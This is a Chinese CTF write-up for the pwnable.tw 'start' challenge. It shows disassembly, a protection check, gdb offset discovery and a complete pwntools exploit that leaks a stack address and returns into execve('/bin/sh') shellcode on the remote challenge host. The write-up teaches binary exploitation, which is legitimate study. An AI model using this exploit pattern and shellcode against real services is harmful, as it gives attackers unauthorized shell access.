# Start
## nc
> nc chall.pwnable.tw 10000

首先执行一下可执行程序发现输出 Let's start the CTF:

之后等待用户输入，然后退出程序

拖入ida分析程序
```
.text:08048060                     public _start
.text:08048060     _start          proc near               ; DATA XREF: LOAD:08048018↑o
.text:08048060 000                 push    esp
.text:08048061 004                 push    offset _exit
.text:08048066 008                 xor     eax, eax
.text:08048068 008                 xor     ebx, ebx
.text:0804806A 008                 xor     ecx, ecx
.text:0804806C 008                 xor     edx, edx
.text:0804806E 008                 push    3A465443h
.text:08048073 00C                 push    20656874h
.text:08048078 010                 push    20747261h
.text:0804807D 014                 push    74732073h
.text:08048082 018                 push    2774654Ch
.text:08048087 01C                 mov     ecx, esp        ; addr
.text:08048089 01C                 mov     dl, 14h         ; len
.text:0804808B 01C                 mov     bl, 1           ; fd
.text:0804808D 01C                 mov     al, 4
.text:0804808F 01C                 int     80h             ; LINUX - sys_write
.text:0804808F                                             ; sys_write(1,'Let's start the CTF:',20)
.text:08048091 01C                 xor     ebx, ebx
.text:08048093 01C                 mov     dl, 3Ch
.text:08048095 01C                 mov     al, 3
.text:08048097 01C                 int     80h             ; LINUX -
.text:08048099 01C                 add     esp, 1Ch
.text:0804809C 000                 retn
.text:0804809C     _start          endp

```
于是逻辑很清晰，就是先执行sys_write(1,"Let's start the CTF:",20)

后执行sys_read(0,&ecx,20)

即先向标准输出写入20字节字符

然后从标准输入读取20字节

由于在mac中无法调试ELF程序于是我用了skysider/pwndocker

> docker pull skysider/pwndocker

> docker run -it skysider/pwndocker

首先checksec
```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```
发现基本没有保护
可以看见No PIE，那么我们首先查看一下docker是否开启ASLR
```
root@571503229c76:/proc/sys# cat /proc/sys/kernel/randomize_va_space
2
```

执行echo 0 /proc/sys/kernel/randomize_va_space会报错

gdb调试start也会出现异常导致程序运行起来但是无法停止调试的情况

这时需要在docker run时加入选项 --cap-add=SYS_PTRACE --security-opt seccomp=unconfined
重新启用docker发现可以正常调试了

分析代码已经可以知道这是一个栈溢出漏洞，栈空间大小为20。但我们还是可以通过脚本跑一下

并且由于0x08048087 mov ecx,esp可以导致栈基址泄露

而我们程序没有任何保护，因此可以写入shellcode，控制EIP指向shellcode从而执行任意代码。

>pattern.py

首先通过pattern生成一个100bytes大小的测试字符串

root@571503229c76:~/pwn/pwnable.tw/start# python pattern.py create 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
root@571503229c76:~/pwn/pwnable.tw/start# gdb start
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 165 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from start...(no debugging symbols found)...done.
pwndbg> r
Starting program: /root/pwn/pwnable.tw/start/start
Let's start the CTF:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37614136 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────
*EAX  0x3c
 EBX  0x0
*ECX  0xffffd7a4 ◂— 0x41306141 ('Aa0A')
*EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
*ESP  0xffffd7bc ◂— 0x41386141 ('Aa8A')
*EIP  0x37614136 ('6Aa7')
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x37614136










─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffd7bc ◂— 0x41386141 ('Aa8A')
01:0004│      0xffffd7c0 ◂— 0x62413961 ('a9Ab')
02:0008│      0xffffd7c4 ◂— 0x31624130 ('0Ab1')
03:000c│      0xffffd7c8 ◂— 0x41326241 ('Ab2A')
04:0010│      0xffffd7cc ◂— 0x62413362 ('b3Ab')
05:0014│      0xffffd7d0 ◂— 0x35624134 ('4Ab5')
06:0018│      0xffffd7d4 ◂— 0x41366241 ('Ab6A')
07:001c│      0xffffd7d8 ◂— 0x62413762 ('b7Ab')
───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0 37614136
Program received signal SIGSEGV (fault address 0x37614136)
pwndbg> Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Undefined command: "Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A".  Try "help".
pwndbg> q

root@571503229c76:~/pwn/pwnable.tw/start# python pattern.py offset 0x37614136
hex pattern decoded as: 6Aa7
20
```
那么攻击思路就很明确了，利用栈可执行向栈中写入shellcode，然后通过mov ecx,esp泄露栈地址，然后sys_write会将esp输出，再将shell写入栈空间中，构造返回地址为esp+0x14，将shellcode写入esp+0x14内存中，即可完成pwn

攻击脚本如下：
```python
#!/bin/bash
# coding = utf-8
# author = Mr.BeanX
# date = 2018-5-27

from pwn import *

host = 'chall.pwnable.tw'
port = 10000

gadget = 0x8048087
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

def exp():
	p = remote(host,port)
	print p.recv()
	p.send('A'*20+p32(gadget))
	leak_stack = u32(p.recv(4))
	print 'stack addr: '+hex(leak_stack)

	payload = 'A'*0x14+p32(leak_stack+0x14)+shellcode
	p.send(payload)
	p.interactive('\nshell: ')

exp()


```
